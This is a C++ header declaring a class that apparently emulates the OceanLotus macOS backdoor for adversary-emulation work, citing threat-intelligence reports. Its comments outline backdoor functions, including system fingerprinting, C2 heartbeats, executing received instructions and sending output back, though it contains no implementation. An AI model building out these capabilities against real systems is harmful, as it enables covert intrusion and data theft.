#ifndef ClientPP_hpp
#define ClientPP_hpp

#include <string>
#include <stdint.h>
#include <stdbool.h>

#include "Communication.hpp"
#include "Transform.hpp"

class ClientPP
{
public:
    /*
    Variables modeled after HandlePP class - https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html
    May end up removing some if unneeded
    */
    std::string pathProcess;
    int8_t      clientID[24];
    std::string strClientID;
    int64_t     installTime;
    void        *urlRequest;
    int8_t      keyDecrypt[24];
    int64_t     timeCheckRequestTimeout;
    int         posDomain;
    std::string domain;
    int         count;

    /*
    osInfo
        About:
            Modeled after HandlePP::infoClient function. Responsible for collecting
            OS information, creating the clientID, and submitting to the C2 server:
                - perform OS discovery
                - create clientID
                - send collected information to C2 server via HTTP POST request
        Result:
            boolean - true if already executed or executed successfully, false
                    otherwise
        MITRE ATT&CK Techniques:
        CTI:
            https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html
            https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html
            https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/
        References:
    */
    static bool osInfo(int dwRandomTimeSleep);

    /*
    runClient
        About:
            Modeled after HandlePP::runHandle function. Responsible for performing
            backdoor capabilities:
                - sends heartbeat to C2 server via HTTP GET request
                - performs data transformations
                - executes received instructions
                - sends output to C2 server via HTTP POST request
        Result:
            void - no return value, just performs backdoor capabilities
        MITRE ATT&CK Techniques:
        CTI:
            https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html
            https://www.trendmicro.com/en_us/research/20/k/new-macos-backdoor-connected-to-oceanlotus-surfaces.html
        References:
    */
    static void runClient(int dwRandomTimeSleep);

    /*
    createClientID
        About:
            Modeled after HandlePP::getClientID method. Responsible for generating
            an MD5 hash from the following pieces of information:
                - OS serial number
                - Hardware UUID
                - MAC address
                - Randomly generated UUID
        Result:
            int8_t - pointer to first value of the ID array
        MITRE ATT&CK Techniques:
        CTI:
            https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html
        References:
            (?) https://developer.apple.com/documentation/iokit/iokitlib_h
            (?) https://gist.github.com/JonnyJD/6126680
    */
    static int8_t createClientID();

    /*
    performHTTPRequest
        About:
            Modeled after HandlePP::requestServer method. Responsible for
            calling the loaded CommsLib exported function to generate an HTTP
            request (GET/POST).
        Result:
            void for now - this should return the data structure holding HTTP
            request responses, unclear what this data type is going to be
        MITRE ATT&CK Techniques:
        CTI:
            https://www.trendmicro.com/en_us/research/18/d/new-macos-backdoor-linked-to-oceanlotus-found.html
            https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/
        References:
    */
    static void performHTTPRequest(std::string type, std::vector<unsigned char> data);
};


#endif /* ClientPP_hpp */
